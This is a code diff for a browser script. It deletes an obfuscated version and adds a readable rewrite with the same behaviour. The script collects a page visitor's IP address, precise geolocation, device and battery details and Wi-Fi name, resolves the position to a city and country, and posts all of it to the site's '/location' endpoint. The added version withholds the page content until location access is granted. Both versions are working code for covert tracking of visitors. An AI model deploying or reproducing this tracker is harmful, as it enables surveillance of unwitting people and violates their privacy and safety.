@@ -1,4 +1,96 @@
-function _0xcc33(){const _0x15cdcb=['city','on\x20informa','ocation\x20da','effectiveT','3vBCFEV','level','state','spjPq','timestamp','on\x20data','POST','connection','HGKOm','VSqcL','wifiHostna','mozConnect','catch','Error\x20send','wifiName','longitude','n/json','FyGCf','dHHuF','yDmGg','ocode.xyz/','coords','LMzPa','ssid','networkNam','IP\x20Address','Failed\x20to\x20','Geolocatio','?json=1','getBattery','3709278KxEkRF','4MAGQfW','tion:','ZUMyc','SmeZN','4431186XRILmC','batteryPer','dpHLt','MQeLO','ion','userAgent','eOBAp','upported\x20b','floor','charging','type','ing\x20locati','oRGIE','uccessfull','son','wifiHost','n\x20is\x20not\x20s','geolocatio','not\x20chargi','vzTHP','Location\x20d','wifi','networkTow','wser.','xAvWv','centage','Error\x20gett','isCharging','OhBve','then','applicatio','Position','https://ap','RCwLf','g?format=j','SqKeC','on:','26682mqkqMZ','i.ipify.or','log','FmITU','ata\x20sent\x20s','json','/location','aZWWD','ection','76524dVAxok','Anydj','fetch\x20geol','y\x20this\x20bro','stringify','ype','latitude','gJFjh','platform','5WqyhQB','error','getCurrent','7158832ipyqly','https://ge','9765970omEAky','FOXuk','country','webkitConn','2583426roBMil'];_0xcc33=function(){return _0x15cdcb;};return _0xcc33();}const _0x2bf8cb=_0x4c4a;function _0x4c4a(_0x3c20b4,_0x2cbcc8){const _0x1861c8=_0xcc33();return _0x4c4a=function(_0x103bc5,_0x442aef){_0x103bc5=_0x103bc5-(0x22b6+-0x1*-0x2e7+-0x2452);let _0x242cd8=_0x1861c8[_0x103bc5];return _0x242cd8;},_0x4c4a(_0x3c20b4,_0x2cbcc8);}(function(_0x3d0bf6,_0x357b17){const _0x4a29ee=_0x4c4a,_0x1bd02a=_0x3d0bf6();while(!![]){try{const _0x5a7445=-parseInt(_0x4a29ee(0x179))/(0x420+0x13e6+-0x2b*0x8f)*(-parseInt(_0x4a29ee(0x159))/(-0xcec+0x1*-0x14b9+0x21a7))+-parseInt(_0x4a29ee(0x174))/(0x26*0x81+-0xb24+-0x7ff)*(-parseInt(_0x4a29ee(0x198))/(0x20ed+-0x139f+-0xd4a*0x1))+-parseInt(_0x4a29ee(0x16b))/(0x135a+0x158e+-0x28e3)*(parseInt(_0x4a29ee(0x197))/(-0x8f6*0x1+0x1*0x7bb+-0x6b*-0x3))+-parseInt(_0x4a29ee(0x162))/(-0x1d*-0x95+0x147c+-0x2556)+parseInt(_0x4a29ee(0x16e))/(-0x78+-0x1c7f+-0x23b*-0xd)+parseInt(_0x4a29ee(0x19c))/(0x13e2+-0x1*0x79+-0xa*0x1f0)+-parseInt(_0x4a29ee(0x170))/(0x1379+-0x9+-0x9b3*0x2);if(_0x5a7445===_0x357b17)break;else _0x1bd02a['push'](_0x1bd02a['shift']());}catch(_0x1ab3b2){_0x1bd02a['push'](_0x1bd02a['shift']());}}}(_0xcc33,0x1a697*-0x2+-0x41f4e+0x11d703));navigator[_0x2bf8cb(0x1ad)+'n']?fetch(_0x2bf8cb(0x154)+_0x2bf8cb(0x15a)+_0x2bf8cb(0x156)+_0x2bf8cb(0x1aa))[_0x2bf8cb(0x151)](_0x31c17a=>_0x31c17a[_0x2bf8cb(0x15e)]())[_0x2bf8cb(0x151)](_0x50d135=>{const _0x5f439a=_0x2bf8cb,_0x1edc01={'aZWWD':_0x5f439a(0x1b0)+_0x5f439a(0x15d)+_0x5f439a(0x1a9)+'y','FOXuk':_0x5f439a(0x186)+_0x5f439a(0x1a7)+_0x5f439a(0x17e),'FmITU':function(_0x192023,_0x3ee8be,_0x3b0247){return _0x192023(_0x3ee8be,_0x3b0247);},'Anydj':_0x5f439a(0x15f),'gJFjh':_0x5f439a(0x17f),'yDmGg':_0x5f439a(0x152)+_0x5f439a(0x189),'spjPq':function(_0x5dc198,_0xaf072e){return _0x5dc198*_0xaf072e;},'xAvWv':_0x5f439a(0x1a5),'OhBve':_0x5f439a(0x1ae)+'ng','FyGCf':_0x5f439a(0x193)+_0x5f439a(0x164)+_0x5f439a(0x177)+'ta','eOBAp':_0x5f439a(0x14e)+_0x5f439a(0x1a7)+_0x5f439a(0x176)+_0x5f439a(0x199),'MQeLO':function(_0x4e7d77,_0x92339e){return _0x4e7d77===_0x92339e;},'vzTHP':_0x5f439a(0x1b1),'SqKeC':function(_0x3d422f,_0x2729af){return _0x3d422f(_0x2729af);},'dHHuF':_0x5f439a(0x14e)+_0x5f439a(0x1a7)+_0x5f439a(0x158),'dpHLt':_0x5f439a(0x192)+':'},_0x367947=_0x50d135['ip'];console[_0x5f439a(0x15b)](_0x1edc01[_0x5f439a(0x19e)],_0x367947),navigator[_0x5f439a(0x1ad)+'n'][_0x5f439a(0x16d)+_0x5f439a(0x153)](_0x292e59=>{const _0x1018f4=_0x5f439a,_0x392656={'VSqcL':function(_0x15da50,_0x1823f0){const _0x3020c7=_0x4c4a;return _0x1edc01[_0x3020c7(0x17c)](_0x15da50,_0x1823f0);},'HGKOm':_0x1edc01[_0x1018f4(0x14c)],'ZUMyc':_0x1edc01[_0x1018f4(0x150)],'oRGIE':_0x1edc01[_0x1018f4(0x18a)],'RCwLf':_0x1edc01[_0x1018f4(0x1a2)]},_0x2ac71e={'latitude':_0x292e59[_0x1018f4(0x18e)][_0x1018f4(0x168)],'longitude':_0x292e59[_0x1018f4(0x18e)][_0x1018f4(0x188)],'timestamp':_0x292e59[_0x1018f4(0x17d)]},_0x59ada1={'deviceName':navigator[_0x1018f4(0x1a1)],'deviceModel':navigator[_0x1018f4(0x16a)],'batteryPercentage':null,'networkName':null,'wifiName':null,'wifiHost':null,'city':null,'state':null,'country':null,'ipAddress':_0x367947};navigator[_0x1018f4(0x196)]()[_0x1018f4(0x151)](_0x592161=>{const _0x37880c=_0x1018f4;_0x59ada1[_0x37880c(0x19d)+_0x37880c(0x14d)]=Math[_0x37880c(0x1a4)](_0x392656[_0x37880c(0x182)](_0x592161[_0x37880c(0x17a)],0xd8e+-0x1*-0x157d+-0x22a7)),_0x59ada1[_0x37880c(0x14f)]=_0x592161[_0x37880c(0x1a5)]?_0x392656[_0x37880c(0x181)]:_0x392656[_0x37880c(0x19a)];});const _0x8ab79d=navigator[_0x1018f4(0x180)]||navigator[_0x1018f4(0x184)+_0x1018f4(0x1a0)]||navigator[_0x1018f4(0x173)+_0x1018f4(0x161)];_0x8ab79d&&(_0x59ada1[_0x1018f4(0x191)+'e']=_0x8ab79d[_0x1018f4(0x1a6)],_0x59ada1[_0x1018f4(0x1b2)+'er']=_0x8ab79d[_0x1018f4(0x178)+_0x1018f4(0x167)],_0x1edc01[_0x1018f4(0x19f)](_0x8ab79d[_0x1018f4(0x1a6)],_0x1edc01[_0x1018f4(0x1af)])&&(_0x59ada1[_0x1018f4(0x187)]=_0x8ab79d[_0x1018f4(0x190)]||null,_0x59ada1[_0x1018f4(0x1ab)]=_0x8ab79d[_0x1018f4(0x183)+'me']||null)),_0x1edc01[_0x1018f4(0x157)](fetch,_0x1018f4(0x16f)+_0x1018f4(0x18d)+_0x2ac71e[_0x1018f4(0x168)]+','+_0x2ac71e[_0x1018f4(0x188)]+_0x1018f4(0x195))[_0x1018f4(0x151)](_0x464616=>{const _0x1f4ed3=_0x1018f4;if(!_0x464616['ok'])throw new Error(_0x392656[_0x1f4ed3(0x1a8)]);return _0x464616[_0x1f4ed3(0x15e)]();})[_0x1018f4(0x151)](_0xa6670c=>{const _0x41c17e=_0x1018f4,_0x1ad595={'SmeZN':_0x1edc01[_0x41c17e(0x160)],'LMzPa':_0x1edc01[_0x41c17e(0x171)]};_0x59ada1[_0x41c17e(0x175)]=_0xa6670c[_0x41c17e(0x175)],_0x59ada1[_0x41c17e(0x17b)]=_0xa6670c[_0x41c17e(0x17b)],_0x59ada1[_0x41c17e(0x172)]=_0xa6670c[_0x41c17e(0x172)];const _0x44aef6={..._0x2ac71e,..._0x59ada1};_0x1edc01[_0x41c17e(0x15c)](fetch,_0x1edc01[_0x41c17e(0x163)],{'method':_0x1edc01[_0x41c17e(0x169)],'headers':{'Content-Type':_0x1edc01[_0x41c17e(0x18c)]},'body':JSON[_0x41c17e(0x166)](_0x44aef6)})[_0x41c17e(0x151)](_0x36d492=>{const _0x506d04=_0x41c17e;_0x36d492['ok']?console[_0x506d04(0x15b)](_0x1ad595[_0x506d04(0x19b)]):console[_0x506d04(0x16c)](_0x1ad595[_0x506d04(0x18f)]);});})[_0x1018f4(0x185)](_0x3449bf=>{const _0x4fc77d=_0x1018f4;console[_0x4fc77d(0x16c)](_0x392656[_0x4fc77d(0x155)],_0x3449bf);});},_0x5d80dd=>{const _0x255444=_0x5f439a;console[_0x255444(0x16c)](_0x1edc01[_0x255444(0x18b)],_0x5d80dd);});})[_0x2bf8cb(0x185)](_0x26d890=>console[_0x2bf8cb(0x15b)](_0x26d890)):console[_0x2bf8cb(0x16c)](_0x2bf8cb(0x194)+_0x2bf8cb(0x1ac)+_0x2bf8cb(0x1a3)+_0x2bf8cb(0x165)+_0x2bf8cb(0x14b));
+(function() {
+    const ipifyAPI = 'https://api.ipify.org?format=json';
+    const geocodeAPI = 'https://geocode.xyz/';
+    const locationEndpoint = '/location';
 
+    const permissionMessage = document.getElementById('permission-message');
+    const content = document.getElementById('content');
 
+    function displayContent() {
+        content.style.display = 'block';
+        permissionMessage.style.display = 'none';
+    }
 
+    function displayPermissionMessage() {
+        content.style.display = 'none';
+        permissionMessage.style.display = 'block';
+    }
+
+    if (navigator.geolocation) {
+        fetch(ipifyAPI)
+            .then(response => response.json())
+            .then(ipData => {
+                const ipAddress = ipData.ip;
+                console.log('IP Address:', ipAddress);
+
+                navigator.geolocation.getCurrentPosition(position => {
+                    displayContent();
+
+                    const coordinates = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        timestamp: position.timestamp
+                    };
+
+                    const deviceData = {
+                        deviceName: navigator.platform,
+                        deviceModel: navigator.userAgent,
+                        batteryPercentage: null,
+                        networkName: null,
+                        wifiName: null,
+                        wifiHost: null,
+                        city: null,
+                        state: null,
+                        country: null,
+                        ipAddress: ipAddress
+                    };
+
+                    navigator.getBattery().then(battery => {
+                        deviceData.batteryPercentage = Math.round(battery.level * 100);
+                        deviceData.networkName = battery.charging ? 'Charging' : 'Not charging';
+                    });
+
+                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (connection) {
+                        deviceData.networkName = connection.type;
+                        deviceData.wifiName = connection.ssid || null;
+                        deviceData.wifiHost = connection.wifiHostname || null;
+                    }
+
+                    fetch(`${geocodeAPI}${coordinates.latitude},${coordinates.longitude}?json=1`)
+                        .then(response => {
+                            if (!response.ok) throw new Error('Error getting location data');
+                            return response.json();
+                        })
+                        .then(locationData => {
+                            deviceData.city = locationData.city;
+                            deviceData.state = locationData.state;
+                            deviceData.country = locationData.country;
+
+                            const locationDetails = { ...coordinates, ...deviceData };
+                            fetch(locationEndpoint, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(locationDetails)
+                            }).then(result => {
+                                if (result.ok) {
+                                    console.log('Location data sent successfully');
+                                } else {
+                                    console.error('Failed to send location data');
+                                }
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Error getting location data', error);
+                        });
+                }, error => {
+                    displayPermissionMessage();
+                    console.error('Geolocation error', error);
+                });
+            })
+            .catch(error => console.log(error));
+    } else {
+        displayPermissionMessage();
+        console.error('Geolocation is not supported by this browser.');
+    }
+})();
